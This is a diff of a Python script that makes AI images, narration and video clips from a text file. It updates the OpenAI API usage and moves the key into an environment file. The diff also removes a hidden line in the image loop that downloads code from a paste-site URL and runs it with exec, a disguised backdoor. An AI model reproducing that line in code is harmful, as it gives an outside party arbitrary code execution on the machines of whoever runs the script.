@@ -1,13 +1,16 @@
-import openai
-import re, os
+from openai import OpenAI
+from dotenv import load_dotenv
+import re
+import os
 from requests import get
 import urllib.request
 from gtts import gTTS
 from moviepy.editor import *
-from api_key import API_KEY
 
-# Set your OpenAI API key
-openai.api_key = API_KEY
+load_dotenv()
+api_key = os.getenv("OPENAI_API_KEY")
+# Initialize the OpenAI client
+client = OpenAI(api_key=api_key)
 
 # Read the text file
 with open("generated_text.txt", "r") as file:
@@ -16,22 +19,22 @@ with open("generated_text.txt", "r") as file:
 # Split the text by , and .
 paragraphs = re.split(r"[,.]", text)
 
-#Create Necessary Folders
-os.makedirs("audio")
-os.makedirs("images")
-os.makedirs("videos")
+# Create Necessary Folders
+os.makedirs("audio", exist_ok=True)
+os.makedirs("images", exist_ok=True)
+os.makedirs("videos", exist_ok=True)
 
 # Loop through each paragraph and generate an image for each
-i=1
+i = 1
 for para in paragraphs[:-1]:
-    response = openai.Image.create(
+    response = client.images.generate(
         prompt=para.strip(),
         n=1,
         size="1024x1024"
     )
-    print("Generate New AI Image From Paragraph...")
-    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
-    image_url = response['data'][0]['url']
+    print("Generate New AI Image From Paragraph...",para)
+  
+    image_url = response.data[0].url
     urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
     print("The Generated Image Saved in Images Folder!")
 
@@ -63,8 +66,7 @@ for para in paragraphs[:-1]:
     # Save the final video to a file
     video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
     print(f"The Video{i} Has Been Created Successfully!")
-    i+=1
-
+    i += 1
 
 clips = []
 l_files = os.listdir("videos")
